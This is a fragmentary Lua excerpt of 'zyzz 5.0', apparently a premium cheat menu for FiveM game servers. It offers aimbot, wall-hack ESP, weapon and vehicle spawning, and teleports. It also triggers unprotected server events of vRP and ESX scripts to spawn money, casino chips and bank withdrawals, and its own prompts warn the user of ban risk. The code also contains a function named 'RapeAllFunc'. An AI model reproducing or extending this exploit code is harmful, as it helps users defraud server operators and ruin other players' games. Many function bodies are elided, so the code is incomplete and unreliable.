					elseif zyzz.CheckBox("~u~Ragebot", Ragebot) then
						Ragebot = not Ragebot
					end


			-- SPECIFIC WEAPON MENU
			elseif zyzz.IsMenuOpened('weaponspawner') then
				if zyzz.MenuButton('Melee Weapons', 'melee') then
				elseif zyzz.MenuButton('Pistols', 'pistol') then
				elseif zyzz.MenuButton('SMGs / MGs', 'smg') then
				elseif zyzz.MenuButton('Shotguns', 'shotgun') then
				elseif zyzz.MenuButton('Assault Rifles', 'assault') then
				elseif zyzz.MenuButton('Sniper Rifles', 'sniper') then
				elseif zyzz.MenuButton('Thrown Weapons', 'thrown') then
				elseif zyzz.MenuButton('Heavy Weapons', 'heavy') then
				end

			-- MELEE WEAPON MENU
			elseif zyzz.IsMenuOpened('melee') then
				for i = 1, #meleeweapons do
					if zyzz.Button("~r~» ~s~"..meleeweapons[i][2].."") then
						GiveWeapon(selectedPlayer, meleeweapons[i][1])
					end
				end
			-- PISTOL MENU
			elseif zyzz.IsMenuOpened('pistol') then
				for i = 1, #pistolweapons do
					if zyzz.Button("~r~» ~s~"..pistolweapons[i][2].."") then
						GiveWeapon(selectedPlayer, pistolweapons[i][1])
					elseif zyzz.Button("Remover ~b~Ammo") then
						SetPedAmmo(GetPlayerPed(-1), GetHashKey(pistolweapons[i][1]), 0)
					end
				end
			-- SMG MENU
			elseif zyzz.IsMenuOpened('smg') then
				for i = 1, #smgweapons do
					if zyzz.Button("~r~» ~s~"..smgweapons[i][2].."") then
			...
			-- SHOTGUN MENU
			elseif zyzz.IsMenuOpened('shotgun') then
				for i = 1, #shotgunweapons do
					if zyzz.Button("~r~» ~s~"..shotgunweapons[i][2].."") then
			...
			-- ASSAULT RIFLE MENU
			elseif zyzz.IsMenuOpened('assault') then
				for i = 1, #assaultweapons do
					if zyzz.Button("~r~» ~s~"..assaultweapons[i][2].."") then
			...
			-- SNIPER MENU
			elseif zyzz.IsMenuOpened('sniper') then
				for i = 1, #sniperweapons do
					if zyzz.Button("~r~» ~s~"..sniperweapons[i][2].."") then
			...
			-- THROWN WEAPON MENU
			elseif zyzz.IsMenuOpened('thrown') then
				for i = 1, #thrownweapons do
					if zyzz.Button("~r~» ~s~"..thrownweapons[i][2].."") then
			...
			-- HEAVY WEAPON MENU
			elseif zyzz.IsMenuOpened('heavy') then
				for i = 1, #heavyweapons do
					if zyzz.Button("~r~» ~s~"..heavyweapons[i][2].."") then
			...
			elseif zyzz.IsMenuOpened('vehicle') then
				if zyzz.MenuButton("Vehicle Spawner", 'vehiclespawner') then
					elseif zyzz.MenuButton("~r~Vehicle Mods", 'vehiclemods') then
					elseif zyzz.MenuButton("Vehicle Control Menu", 'vehiclemenu') then
					elseif zyzz.ComboBox("Vehicle Functions ~y~»", {"Repair ~b~Vehicle", "Clean ~g~Vehicle", "Dirty ~c~Vehicle"}, currVFuncIndex, selVFuncIndex, function(currentIndex, selClothingIndex)
					...
					elseif zyzz.Button("Buy vehicle for free") then
					...
					elseif zyzz.CheckBox("Drift", driftMode) then
						driftMode = not driftMode
					elseif zyzz.CheckBox("Collision", Collision) then
						Collision = not Collision
					elseif zyzz.ComboBoxSlider("Speed Multiplier", SpeedModOps, currSpeedIndex, selSpeedIndex, function(currentIndex, selectedIndex)
						...
						elseif zyzz.CheckBox("Easy Handling / Stick To Floor", EasyHandling) then
						...
						elseif zyzz.CheckBox("Deadly Bulldozer", DeadlyBulldozer) then
			...
			-- VEHICLE SPAWNER MENU
			elseif zyzz.IsMenuOpened('vehiclespawner') then
				if zyzz.Button("Spawn Vehicle By Name") then
					local model = GetKeyboardInput("Enter Model Name:")
					SpawnVeh(model, PlaceSelf, SpawnEngineOn)
				elseif zyzz.CheckBox("Put Self Into Spawned Vehicle", PlaceSelf, "No", "Yes") then
					PlaceSelf = not PlaceSelf
				elseif zyzz.CheckBox("Spawn Planes In Air", SpawnInAir, "No", "Yes") then
					SpawnInAir = not SpawnInAir
				elseif zyzz.CheckBox("Spawn Vehicle With Engine : ", SpawnEngineOn, "No", "Yes") then
					SpawnEngineOn = not SpawnEngineOn
				elseif zyzz.MenuButton('Compacts', 'compacts') then
				elseif zyzz.MenuButton('Sedans', 'sedans') then
				elseif zyzz.MenuButton('SUVs', 'suvs') then
				elseif zyzz.MenuButton('Coupes', 'coupes') then
				elseif zyzz.MenuButton('Muscle', 'muscle') then
				elseif zyzz.MenuButton('Sports Classics', 'sportsclassics') then
				elseif zyzz.MenuButton('Sports', 'sports') then
				elseif zyzz.MenuButton('Super', 'super') then
				elseif zyzz.MenuButton('Motorcycles', 'motorcycles') then
				elseif zyzz.MenuButton('Off-Road', 'offroad') then
				elseif zyzz.MenuButton('Industrial', 'industrial') then
				elseif zyzz.MenuButton('Utility', 'utility') then
				elseif zyzz.MenuButton('Vans', 'vans') then
				elseif zyzz.MenuButton('Cycles', 'cycles') then
				elseif zyzz.MenuButton('Boats', 'boats') then
				elseif zyzz.MenuButton('Helicopters', 'helicopters') then
				elseif zyzz.MenuButton('Planes', 'planes') then
				elseif zyzz.MenuButton('Service/Emergency/Military', 'service') then
				elseif zyzz.MenuButton('Commercial/Trains', 'commercial') then
				end

			-- COMPACTS SPAWNER
			elseif zyzz.IsMenuOpened('compacts') then
				for i = 1, #compacts do
					...
					local carButton = zyzz.Button(vehname)
					if carButton then
			...
			-- SEDANS SPAWNER
			elseif zyzz.IsMenuOpened('sedans') then
				for i = 1, #sedans do
			...
			-- SUVs SPAWNER
			elseif zyzz.IsMenuOpened('suvs') then
				for i = 1, #suvs do
			...
			-- COUPES SPAWNER
			elseif zyzz.IsMenuOpened('coupes') then
				for i = 1, #coupes do
			...
			-- MUSCLE SPAWNER
			elseif zyzz.IsMenuOpened('muscle') then
				for i = 1, #muscle do
			...
			elseif zyzz.IsMenuOpened('sportsclassics') then
			...
			-- SPORTS SPAWNER
			elseif zyzz.IsMenuOpened('sports') then
				for i = 1, #sports do
			...
			-- SUPER SPAWNER
			elseif zyzz.IsMenuOpened('super') then
				for i = 1, #super do
			...
			-- MOTORCYCLES SPAWNER
			elseif zyzz.IsMenuOpened('motorcycles') then
			...
			-- OFFROAD SPAWNER
			elseif zyzz.IsMenuOpened('offroad') then
				for i = 1, #offroad do
			...
			-- INDUSTRIAL SPAWNER
			elseif zyzz.IsMenuOpened('industrial') then
			...
			-- UTILITY SPAWNER
			elseif zyzz.IsMenuOpened('utility') then
				for i = 1, #utility do
			...
			-- VANS SPAWNER
			elseif zyzz.IsMenuOpened('vans') then
				for i = 1, #vans do
			...
			-- CYCLES SPAWNER
			elseif zyzz.IsMenuOpened('cycles') then
				for i = 1, #cycles do
			...
			-- BOATS SPAWNER
			elseif zyzz.IsMenuOpened('boats') then
				for i = 1, #boats do
			...
			-- HELICOPTERS SPAWNER
			elseif zyzz.IsMenuOpened('helicopters') then
			...
			-- PLANES SPAWNER
			elseif zyzz.IsMenuOpened('planes') then
				for i = 1, #planes do
			...
			-- SERVICE SPAWNER
			elseif zyzz.IsMenuOpened('service') then
				for i = 1, #service do
			...
			-- COMMERCIAL SPAWNER
			elseif zyzz.IsMenuOpened('commercial') then
			...
			-- VEHICLE MODS MENU
			elseif zyzz.IsMenuOpened('vehiclemods') then
				if zyzz.MenuButton("Vehicle Colors", 'vehiclecolors') then
					elseif zyzz.MenuButton("Tune Vehicle", 'vehicletuning') then
					elseif zyzz.Button("Set Plate Text (8 Characters)") then
						local plateInput = GetKeyboardInput("Enter Plate Text (8 Characters):")
						RequestControlOnce(GetVehiclePedIsIn(PlayerPedId(), 0))
						SetVehicleNumberPlateText(GetVehiclePedIsIn(PlayerPedId(), 0), plateInput)
					elseif zyzz.Button("~h~~r~R~p~a~y~i~m~n~b~b~g~o~o~w ~w~Vehicle Colour") then
				ra = RGBRainbow(1.0)
				...
				elseif zyzz.Button("~h~~r~R~p~a~y~i~m~n~b~b~g~o~o~w ~w~Vehicle Neon") then
			...
			-- VEHICLE COLORS MENU
			elseif zyzz.IsMenuOpened('vehiclecolors') then
				if zyzz.MenuButton("Primary Color", 'vehiclecolors_primary') then
					elseif zyzz.MenuButton("Secondary Color", 'vehiclecolors_secondary') then

				end

			elseif zyzz.IsMenuOpened('vehiclecolors_primary') then
				if zyzz.MenuButton("Classic Colors", 'primary_classic') then
					elseif zyzz.MenuButton("Matte Colors", 'primary_matte') then
					elseif zyzz.MenuButton("Metals", 'primary_metal') then
				end

			elseif zyzz.IsMenuOpened('vehiclecolors_secondary') then
				if zyzz.MenuButton("Classic Colors", 'secondary_classic') then
					elseif zyzz.MenuButton("Matte Colors", 'secondary_matte') then
					elseif zyzz.MenuButton("Metals", 'secondary_metal') then
				end

			-- PRIMARY CLASSIC
			elseif zyzz.IsMenuOpened('primary_classic') then
				for i = 1, #classicColors do
					if zyzz.Button(classicColors[i][1]) then
						local veh = GetVehiclePedIsIn(PlayerPedId(), 0)
			...
			-- PRIMARY MATTE
			elseif zyzz.IsMenuOpened('primary_matte') then
				for i = 1, #matteColors do
					if zyzz.Button(matteColors[i][1]) then
						local veh = GetVehiclePedIsIn(PlayerPedId(), 0)
						local prim, sec = GetVehicleColours(veh)
			...
			-- PRIMARY METAL
			elseif zyzz.IsMenuOpened('primary_metal') then
				for i = 1, #metalColors do
					if zyzz.Button(metalColors[i][1]) then
						local veh = GetVehiclePedIsIn(PlayerPedId(), 0)
						local prim, sec = GetVehicleColours(veh)
			...
			-- SECONDARY CLASSIC
			elseif zyzz.IsMenuOpened('secondary_classic') then
				for i = 1, #classicColors do
					if zyzz.Button(classicColors[i][1]) then
						local veh = GetVehiclePedIsIn(PlayerPedId(), 0)
						local prim, sec = GetVehicleColours(veh)
			...
			-- SECONDARY MATTE
			elseif zyzz.IsMenuOpened('secondary_matte') then
				for i = 1, #matteColors do
					if zyzz.Button(matteColors[i][1]) then
						local veh = GetVehiclePedIsIn(PlayerPedId(), 0)
						local prim, sec = GetVehicleColours(veh)
			...
			-- SECONDARY METAL
			elseif zyzz.IsMenuOpened('secondary_metal') then
				for i = 1, #metalColors do
					if zyzz.Button(metalColors[i][1]) then
						local veh = GetVehiclePedIsIn(PlayerPedId(), 0)
						local prim, sec = GetVehicleColours(veh)
			...
			-- VEHICLE TUNING MENU
			elseif zyzz.IsMenuOpened('vehicletuning') then
			   if zyzz.Button("Max ~r~Exterior Tuning") then
						MaxOut(GetVehiclePedIsUsing(PlayerPedId()))
			elseif zyzz.Button("Max ~r~Performance") then
						engine(GetVehiclePedIsUsing(PlayerPedId()))
			elseif zyzz.Button("Max All ~r~Tuning") then
						engine1(GetVehiclePedIsUsing(PlayerPedId()))
			end


			-- VEHICLE MENU (WIP)
			elseif zyzz.IsMenuOpened('vehiclemenu') then
				if zyzz.CheckBox("Save Personal Vehicle", SavedVehicle, "None", "Saved Vehicle: "..pvehicleText) then
				...
				elseif zyzz.CheckBox("Left Front Door", LeftFrontDoor, "Closed", "Opened") then
				...
				elseif zyzz.CheckBox("Right Front Door", RightFrontDoor, "Closed", "Opened") then -- Is closing when the driver seat has someone
				...
				elseif zyzz.CheckBox("Left Back Door", LeftBackDoor, "Closed", "Opened") then
				...
				elseif zyzz.CheckBox("Right Back Door", RightBackDoor, "Closed", "Opened") then
				...
				elseif zyzz.CheckBox("Hood", FrontHood, "Closed", "Opened") then
				...
				elseif zyzz.CheckBox("Trunk", Trunk, "Closed", "Opened") then
					Trunk = not Trunk
					local vehicle = GetVehiclePedIsIn(PlayerPedId(), 0)
					if Trunk then
				...
				elseif zyzz.CheckBox("Back", Back, "Closed", "Opened") then
					Back = not Back
					local vehicle = GetVehiclePedIsIn(PlayerPedId(), 0)
					if Back then
				...
				elseif zyzz.CheckBox("Back 2", Back2, "Closed", "Opened") then
					Back2 = not Back2
					local vehicle = GetVehiclePedIsIn(PlayerPedId(), 0)
					if Back2 then
			...
			-- WORLD OPTIONS MENU
			elseif zyzz.IsMenuOpened('world') then
				if zyzz.MenuButton("Weather Changer ~r~(CLIENT SIDE)", 'weather') then
				elseif zyzz.MenuButton("Time Changer", 'time') then
				elseif zyzz.CheckBox("Disable Cars", CarsDisabled) then
					CarsDisabled = not CarsDisabled
				elseif zyzz.CheckBox("Disable Guns", GunsDisabled) then
					GunsDisabled = not GunsDisabled
				elseif zyzz.CheckBox("Clear Streets", ClearStreets) then
					ClearStreets = not ClearStreets
				elseif zyzz.CheckBox("Noisy Cars", NoisyCars) then
				...
				elseif zyzz.ComboBoxSlider("Gravity Amount", GravityOpsWords, currGravIndex, selGravIndex, function(currentIndex, selectedIndex)
				 ...
				 elseif zyzz.IsMenuOpened('time') then
				  if zyzz.CheckBox("Christmas Weather", XMAS) then
					XMAS = not XMAS
					if XMAS then
			...
			SetOverrideWeather("XMAS")
					...
					elseif zyzz.CheckBox("Blizzard Weather", BLIZZARD) then
			...
			elseif zyzz.CheckBox("Foggy Weather", FOGGY) then
					FOGGY = not FOGGY
					if FOGGY then
			...
			-- OBJECT SPAWNER MENU
			elseif zyzz.IsMenuOpened('objectspawner') then
				if zyzz.MenuButton("Spawned Objects", 'objectlist') then
				elseif zyzz.ComboBox("~g~Select~s~ To Object~h~~y~ »", objs_tospawn, currObjIndex, selObjIndex, function(currentIndex, selectedIndex)
					currObjIndex = currentIndex
					selObjIndex = currentIndex
					obj = objs_tospawn[currObjIndex]
					end) then
				elseif zyzz.Button("~g~Spawn ~s~Object") then
					local pos = GetEntityCoords(PlayerPedId())
				...
				elseif zyzz.Button("Add Object By Name") then
				...
				elseif zyzz.CheckBox("Visible", objVisible) then
					objVisible = not objVisible
				elseif zyzz.ComboBox("Direction", {"front", "back"}, currDirectionIndex, selDirectionIndex, function(currentIndex, selectedIndex)
					currDirectionIndex = currentIndex
					selDirectionIndex = currentIndex
				end) then
				elseif zyzz.ComboBox("Rotation", RotationOps, currRotationIndex, selRotationIndex, function(currentIndex, selectedIndex)
			...
			elseif zyzz.IsMenuOpened('objectlist') then
				if zyzz.Button("Delete All Spawned Objects") then for i = 1, #SpawnedObjects do RequestControlOnce(SpawnedObjects[i])DeleteObject(SpawnedObjects[i]) end
				else
					for i = 1, #SpawnedObjects do
						if DoesEntityExist(SpawnedObjects[i]) then
							if zyzz.Button("OBJECT [" .. i .. "] WITH ID " .. SpawnedObjects[i]) then
			...
			elseif zyzz.IsMenuOpened('weather') then
				if zyzz.ComboBox("Weather Type", WeathersList, currWeatherIndex, selWeatherIndex, function(currentIndex, selectedIndex)
							 currWeatherIndex = currentIndex
							 selWeatherIndex = currentIndex
							 WeatherType = WeathersList[currentIndex]
				end) then
				elseif zyzz.CheckBox("Weather Changer", WeatherChanger, "Disabled", "Enabled") then
				  WeatherChanger = not WeatherChanger
				end

			-- MISC OPTIONS MENU
			elseif zyzz.IsMenuOpened('misc') then

				if zyzz.MenuButton("ESP & Visual", 'esp') then
				elseif zyzz.MenuButton("~h~∑~r~Info", "InfoMenu") then
				elseif zyzz.CheckBox('Force Map', ForceMap) then
					ForceMap = not ForceMap
				elseif zyzz.CheckBox('Force Third Person', ForceThirdPerson) then
					ForceThirdPerson = not ForceThirdPerson
				elseif zyzz.MenuButton("Web Radio", 'webradio') then
				elseif zyzz.CheckBox("Portable Radio", Radio, "Disabled", "Enabled") then
					Radio = not Radio
					ShowInfo("~r~Portable Radio will override any vehicle's radio!")
				elseif zyzz.ComboBox2("Change Radio Station", RadiosListWords, currRadioIndex, selRadioIndex, function(currentIndex, selectedIndex)
					currRadioIndex = currentIndex
					selRadioIndex = currentIndex
					RadioStation = RadiosList[currentIndex]
				end) then
				elseif zyzz.ComboBox("~r~»  ~s~Menu ~b~X", menuX, currentMenuX, selectedMenuX, function(currentIndex, selectedIndex)
						currentMenuX = currentIndex
						selectedMenuX = currentIndex
						for i = 1, #menulist do
							zyzz.SetMenuX(menulist[i], menuX[currentMenuX])
						end
						end)
						then
				elseif zyzz.ComboBox("~r~»  ~s~Menu ~b~Y", menuY, currentMenuY, selectedMenuY, function(currentIndex, selectedIndex)
						currentMenuY = currentIndex
						selectedMenuY = currentIndex
						for i = 1, #menulist do
							zyzz.SetMenuY(menulist[i], menuY[currentMenuY])
						end
						end)
						then
				elseif zyzz.CheckBox('Always Draw Crosshair', Crosshair) then
					Crosshair = not Crosshair
				elseif zyzz.CheckBox("Show Coordinates", ShowCoords) then
					ShowCoords = not ShowCoords
				elseif zyzz.MenuButton('Credits', 'credits') then
				end

			
			elseif zyzz.IsMenuOpened("InfoMenu") then
				if zyzz.Button("~p~zyzz 5.0") then
				elseif zyzz.Button("~b~zyzz was originally made by ~r~oFlaqme#1149") then
				elseif zyzz.Button("~b~5.0 Developer ~r~oFlaqme#1149") then                    
				elseif zyzz.Button("~b~This menu is a Premium Menu") then
				elseif zyzz.Button("~b~Check out our YT channel ~r~Exia Community") then
				elseif zyzz.Button("~b~Discord ~r~https://discord.gg/eb8sget") then  
				end
				
				-- ESP OPTIONS MENU
			elseif zyzz.IsMenuOpened('esp') then
				if zyzz.CheckBox("Blips", BlipsEnabled) then
					ToggleBlips()
				elseif zyzz.CheckBox("Nametags", NametagsEnabled) then
				...
				elseif zyzz.CheckBox("Alternative (OneSync) Nametags", ANametagsEnabled) then
					ANametagsEnabled = not ANametagsEnabled
				elseif zyzz.CheckBox("Draw Alternative Nametags Through Walls", ANametagsNotNeedLOS) then
					ANametagsNotNeedLOS = not ANametagsNotNeedLOS
				elseif zyzz.CheckBox("ESP", ESPEnabled) then
					ToggleESP()
				elseif zyzz.ComboBoxSlider("ESP Distance", ESPDistanceOps, currESPDistance, selESPDistance, function(currentIndex, selectedIndex)
					currESPDistance = currentIndex
					selESPDistance = currentIndex
					EspDistance = ESPDistanceOps[currESPDistance]
				end) then
				elseif zyzz.ComboBoxSlider("ESP Refresh Rate", ESPRefreshOps, currESPRefreshIndex, selESPRefreshIndex, function(currentIndex, selectedIndex)
				...
				elseif zyzz.CheckBox("Lines", LinesEnabled) then
					LinesEnabled = not LinesEnabled
				end

			-- WEB RADIO MENU
			elseif zyzz.IsMenuOpened('webradio') then
				if zyzz.CheckBox("Classical", ClassicalRadio, "Status: Not Playing", "Status: Playing") then
			...
			elseif zyzz.IsMenuOpened('teleport') then
				if zyzz.MenuButton('Save/Load Position', 'saveload') then
				elseif zyzz.MenuButton('Teleport to POI', 'pois') then
				elseif zyzz.Button('Teleport To Waypoint ~r~(NUM 4)') then
					TeleportToWaypoint()
				elseif zyzz.Button('Teleport FBI') then
					fbi()
				elseif zyzz.Button('Teleport LS Customs') then
					ls()
				elseif zyzz.Button('Teleport Main Garage') then
					gp()
				elseif zyzz.Button('Teleport Ammunation') then
					Ammunation()
				elseif zyzz.Button('Teleport Clothes shop') then
					shopclothes()
				elseif zyzz.Button('Teleport Barber') then
					barber()
				end


			elseif zyzz.IsMenuOpened('saveload') then
				if zyzz.ComboBox("Saved Location 1", {"save", "load"}, currSaveLoadIndex1, selSaveLoadIndex1, function(currentIndex, selectedIndex)
				...
				elseif zyzz.ComboBox("Saved Location 2", {"save", "load"}, currSaveLoadIndex2, selSaveLoadIndex2, function(currentIndex, selectedIndex)
				...
				elseif zyzz.ComboBox("Saved Location 3", {"save", "load"}, currSaveLoadIndex3, selSaveLoadIndex3, function(currentIndex, selectedIndex)
				...
				elseif zyzz.ComboBox("Saved Location 4", {"save", "load"}, currSaveLoadIndex4, selSaveLoadIndex4, function(currentIndex, selectedIndex)
				...
				elseif zyzz.ComboBox("Saved Location 5", {"save", "load"}, currSaveLoadIndex5, selSaveLoadIndex5, function(currentIndex, selectedIndex)
			...
			elseif zyzz.IsMenuOpened('lua') then
				...
				elseif zyzz.Button("~g~MONEY ~r~(RISK) ~w~(Taxi_Job)") then
					local confirm = GetKeyboardInput("Using this option will ~r~risk banned ~s~server! Are you Sure? ~g~Y~w~/~r~N")
				 if string.lower(confirm) == "y" then
				...
				elseif zyzz.Button("~g~MONEY ~b~VRP~w~ (vrp_trucker)") then
				...
				elseif zyzz.Button("~g~MONEY~b~ VRP~w~ (vrp_casino)") then
					...
					elseif zyzz.MenuButton('~g~ESX ~s~Options', 'esx') then
					elseif zyzz.MenuButton('~g~ESX ~s~Set Jobs ~r~(RISK) ', 'other') then
					elseif zyzz.MenuButton('~b~vRP ~s~Options', 'vrp') then
				end

			-- Spawn Money
			elseif zyzz.IsMenuOpened('money') then
				if zyzz.Button("~r~~h~VRP ~s~Money ~g~10k+") then
			...
			elseif zyzz.Button("~r~~h~VRP ~s~Money ~g~20k+") then
			...
			elseif zyzz.Button("~r~~h~VRP ~s~Money ~g~30k+") then
			...
			elseif zyzz.Button("~r~~h~VRP ~s~Money ~g~40k+") then
			...
			elseif zyzz.Button("~r~~h~VRP ~s~Money ~g~50k+") then
			...
			elseif zyzz.Button("~r~~h~VRP ~s~Money ~g~60k+") then
			...
			elseif zyzz.Button("~r~~h~VRP ~s~Money ~g~70k+") then
			...
			elseif zyzz.Button("~r~~h~VRP ~s~Money ~g~80k+") then
			...
			elseif zyzz.Button("~r~~h~VRP ~s~Money ~g~90k+") then
			...
			elseif zyzz.Button("~r~~h~VRP ~s~Money ~g~100k+") then
			...
			elseif zyzz.Button("~r~~h~VRP ~s~Money ~g~200k+") then
			...
			elseif zyzz.Button("~r~~h~VRP ~s~Money ~g~300k+") then
			...
			elseif zyzz.Button("~r~~h~VRP ~s~Money ~g~400k+") then
			...
			elseif zyzz.Button("~r~~h~VRP ~s~Money ~g~500k+") then
				...
				elseif zyzz.IsMenuOpened('other') then
				if zyzz.Button("~r~Remove Job") then
			...
			elseif zyzz.IsMenuOpened('esx') then
				if zyzz.Button("~g~ESX ~w~Restore Hunger") then
					TriggerEvent("esx_status:set", "hunger", 1000000)
				elseif zyzz.Button("~g~ESX ~w~Restore Thirst") then
					TriggerEvent("esx_status:set", "thirst", 1000000)
				elseif zyzz.Button("~g~ESX ~w~Revive Self") then
					TriggerServerEvent('esx_ambulancejob:revive', GetPlayerServerId(PlayerId()))
				elseif zyzz.Button("~g~ESX ~w~Revive By ID") then
			...
			elseif zyzz.IsMenuOpened('vrp') then
				if zyzz.MenuButton("~h~~y~»~r~ Spawn ~b~Money ~r~NEW", 'money') then
				elseif zyzz.Button("~r~~h~VRP ~s~~b~Toggle Handcuffs") then
					vRP.toggleHandcuff()
				elseif zyzz.Button("~r~~h~VRP ~s~~b~Clear Wanted Level") then
					vRP.applyWantedLevel(0)
				elseif zyzz.Button("~r~~h~VRP ~s~~b~Give Money (vrp_trucker)") then
					local money = GetKeyboardInput("Enter $ Amount:")
					local distance = money / 3.80 -- money is distance*3.80
					vRPtruckS = Tunnel.getInterface("vRP_trucker", "vRP_trucker")
					vRPtruckS.finishTruckingDelivery({distance})
				elseif zyzz.Button("~r~~h~VRP ~s~~b~Give Casino Chips (vrp_casino)") then
					local amount = GetKeyboardInput("Enter Chips Amount:")
					vRPcasinoS = Tunnel.getInterface("vRP_casino","vRP_casino")
					vRPcasinoS.payRouletteWinnings({amount, 2})
				elseif zyzz.Button("~r~~h~VRP ~s~~b~Bank Deposit ~r~NEW") then
					local result = KeyboardInput("Enter amount of money", "", 100)
					if result then
					TriggerServerEvent("bank:deposit", result)
					end
				elseif zyzz.Button("~r~~h~VRP ~s~~b~Bank Withdraw ~r~NEW") then
					local result = KeyboardInput("Enter amount of money", "", 100)
					if result then
					TriggerServerEvent("bank:withdraw", result)
					end
				elseif zyzz.Button("~r~~h~VRP ~s~~b~Get driving license ~r~NEW") then
					TriggerServerEvent("dmv:success")
				end


			elseif zyzz.IsMenuOpened('credits') then
				for i = 1, #developers do if zyzz.Button(developers[i]) then end end

			elseif IsDisabledControlJustReleased(0, Keys[menuKeybind]) then zyzz.OpenMenu('zyzz')


			elseif IsDisabledControlPressed(0, Keys[menuKeybind2]) then zyzz.OpenMenu('zyzz')
		...
		function RapeAllFunc()
			...
			if zyzz.IsMenuOpened('objectlist') then
				for i = 1, #SpawnedObjects do
